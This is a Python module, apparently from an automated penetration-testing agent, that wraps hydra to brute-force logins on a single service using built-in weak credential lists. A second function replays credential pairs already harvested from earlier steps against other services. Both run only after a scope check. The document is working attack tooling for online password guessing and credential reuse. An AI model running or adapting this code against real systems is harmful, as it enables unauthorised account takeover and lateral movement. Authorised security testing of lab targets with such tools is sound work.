"""Online credential attack (hydra) against ONE service of an in-scope target.
Bounded to a small built-in list of common weak credentials (lab-grade), so the
run stays fast and predictable. Scope-gated like every other tool."""

import os
import subprocess
import tempfile

from scope import load_scope, is_in_scope

USERS = ["msfadmin", "user", "admin", "root", "service", "postgres"]
PASSWORDS = ["msfadmin", "user", "admin", "password", "root", "toor", "postgres", "123456"]

# Per-service hydra timeout in seconds. telnet negotiates slowly and can hang,
# so we cap it low (fail fast, move on) instead of wasting the default budget.
DEFAULT_TIMEOUT = 180
SERVICE_TIMEOUTS = {"telnet": 45}


def _timeout_for(service):
    return SERVICE_TIMEOUTS.get(service, DEFAULT_TIMEOUT)


def run_hydra(target, service, scope_file):
    service = "".join(ch for ch in str(service).lower() if ch.isalnum())
    if not service:
        return None
    if not is_in_scope(target, load_scope(scope_file)):
        return None
    uf = tempfile.NamedTemporaryFile("w", suffix=".txt", delete=False)
    uf.write("\n".join(USERS) + "\n")
    uf.close()
    pf = tempfile.NamedTemporaryFile("w", suffix=".txt", delete=False)
    pf.write("\n".join(PASSWORDS) + "\n")
    pf.close()
    try:
        result = subprocess.run(
            ["hydra", "-L", uf.name, "-P", pf.name, "-t", "4", target, service],
            capture_output=True, text=True, timeout=_timeout_for(service),
        )
        return (result.stdout + result.stderr).strip()
    except subprocess.TimeoutExpired:
        return f"hydra on {service} timed out."
    finally:
        os.unlink(uf.name)
        os.unlink(pf.name)


def run_hydra_combo(target, service, pairs, scope_file):
    """Credential reuse: replay already-found user:pass pairs against ONE auth
    service with `hydra -C`. 'pairs' is a list of dicts with 'user'/'password'
    keys (as produced by agent.extract_credential_pairs). Scope-gated like the
    rest. Returns None if nothing to try, bad service, or target out of scope."""
    service = "".join(ch for ch in str(service).lower() if ch.isalnum())
    if not service:
        return None
    if not pairs:
        return None
    if not is_in_scope(target, load_scope(scope_file)):
        return None
    combos = []
    seen = set()
    for p in pairs:
        combo = f"{p['user']}:{p['password']}"
        if combo not in seen:
            seen.add(combo)
            combos.append(combo)
    cf = tempfile.NamedTemporaryFile("w", suffix=".txt", delete=False)
    cf.write("\n".join(combos) + "\n")
    cf.close()
    try:
        result = subprocess.run(
            ["hydra", "-C", cf.name, "-t", "4", target, service],
            capture_output=True, text=True, timeout=_timeout_for(service),
        )
        return (result.stdout + result.stderr).strip()
    except subprocess.TimeoutExpired:
        return f"hydra -C on {service} timed out."
    finally:
        os.unlink(cf.name)
